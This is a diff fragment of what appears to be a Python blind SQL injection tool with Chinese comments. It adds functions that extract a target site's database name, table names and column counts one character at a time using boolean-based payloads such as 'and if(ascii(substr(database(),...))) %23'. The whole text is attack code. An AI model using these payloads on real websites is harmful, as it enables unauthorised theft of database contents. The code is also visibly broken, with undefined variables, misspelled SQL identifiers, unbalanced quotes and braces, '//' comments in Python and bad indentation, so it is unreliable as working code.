@@ -2053,7 +2053,7 @@ def StartSqli(url):
         else:
             GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])
 
-//编写获取数据库的函数，根据得到的URL获取数据库名并把最后的结果存入DBName
+//编写获取数据库的函数，根据得到的URL获取数据库名并把最后的结果存入DBName ---逐位枚举 数据库的长度、数据库名
 def GetDBName(url):
     global DBName
     print("[-] 开始获取数据库名的长度")
@@ -2068,6 +2068,61 @@ def GetDBName(url):
     print("[-]开始获取数据库名")
     payload = "'and if(ascii(substr(database(),{0},1))={1},1,0) %23"
     targetUrl = url + payload
+
+    for a in range(1, DBNameLen + 1):  // a表示 substr()函数的截取起始位置
+        for b in range(33, 127):    //b表示在ASCII码中33-126位可显示的字符
+            res = conn.get(targerUrl.format(a,b))
+            if flag in res.content.decode("utf-8"):
+                DBName += chr(b)
+                print("[-]" + DBName)
+                break
+
+//编写获取数据库表的函数，根据获取到的URL和数据库名获取数据中的表，并把结果以列表的形式存入DBTables:
+def GetDBTables(url, dbname):
+    global DBTables
+    DBTableCount = 0
+    print("[-]开始获取{0}数据库表数据:".format(dbname))
+    payload = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) %23"
+    targetUrl = url + payload
+    for DBTableCount in range(1, 99):
+        res = conn.get(targetUrl.format(dbname, DBTableCount))
+        if flag in res.content.decode("utf-8"):
+            print("[+]{0}数据库中表的数量为:{1}".format(dbname, DBTableCount))
+            break
+    print("[-]开始获取{0}数据库的表".format(dbname))
+    tableLen = 0
+    for a in range(0, DBTableCount):
+        print("[-]正在获取第{0}个表名".format(a+1))
+        for tableLen in range(1, 99):
+            payload = "' and if((select LENGTH(table_naem) from infromation_schem.tables where table_schema = '{0}' limit {1},1}={2},1,0) %23"
+            targetUrl = url + payload
+            res = conn.get(targetUrl.format(dbname, a, tableLen))
+            if flag in res.content.decode("utf-8"):
+                break
+
+        table = ""
+        for b in range(1, tableLen+1):
+            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0} limit {1},1),{2},1))={3},1,0) %23"
+            targetUrl = url + payload
+            for c in range(33, 127):
+                res = conn.get(targetUrl.format(dbname, a, b, c))
+                if flag in res.content.decode("utf-8"):
+                    table += chr(c)
+                    print(table)
+                    break
+          DBTables.append(table)
+          table = ""
+
+//编写获取表字段的函数，根据获取的URL、数据库名和数据表，获取表的字段并把结果以列表的形式存入DBColumns
+def GetDBCloums(url, dbname, datable):
+    global DBColums
+    DBColumnCount = 0
+    print("[-] 开始获取{0}数据表的字段数:".format(datable))
+    for DBColumnCount in range(99):
+        payload = "' and if ((select count(column_name) from information_schema.columns where table_schema='{0} and table_name='{1}')={2},1,0) %23"
+        targetUrl = url + payload
+
+
 ```
 
 </details>
